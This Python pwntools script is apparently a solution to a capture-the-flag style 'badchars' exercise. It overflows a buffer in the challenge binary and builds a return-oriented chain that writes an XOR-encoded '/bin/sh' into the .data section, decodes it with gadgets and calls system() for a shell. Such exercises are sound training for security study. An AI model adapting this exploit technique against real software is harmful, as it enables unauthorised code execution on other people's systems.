#!/usr/bin/python

import os
from pwn import *

e = ELF('./badchars')           		# binary
r = process(e.path)


s_data = 0x0000000000601070			    # write string in .data
binsh = 0x38757e7938647f17				# /bin/sh xor 0x17
key = 0x1717171717171717                # xor key = 23
gg1 = 0x0000000000400bac                # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gg2 = 0x0000000000400b34                # mov qword ptr [r13], r12 ; ret
gg3 = 0x0000000000400b30                # xor byte ptr [r15], r14b ; ret
gg4 = 0x0000000000400b42                # pop r15 ; ret
gg5 = 0x0000000000400b39                # pop rdi ; ret

payload = 'A' * 40						# offset to vuln buffer
payload += p64(gg1)
payload += p64(binsh, endian='big')		# pop r12 [/bin/sh]
payload += p64(s_data) 					# pop r13 [.data]
payload += p64(key)                     # pop r14 [xor key]
payload += p64(s_data) 					# pop r15 [.data]
payload += p64(gg2)						# copy r12 into [r13]


for i in range (0, 8):
    payload += p64(gg4)
    payload += p64(s_data+i)            # pop r15 [.data+i]
    payload += p64(gg3)                 # 0x17 xor [.data+i]


payload += p64(gg5)
payload += p64(s_data) 					# pop rdi [.data]
payload += p64(e.symbols['system'])


r.recvuntil('>')
r.sendline(payload)						# send payload
r.interactive()
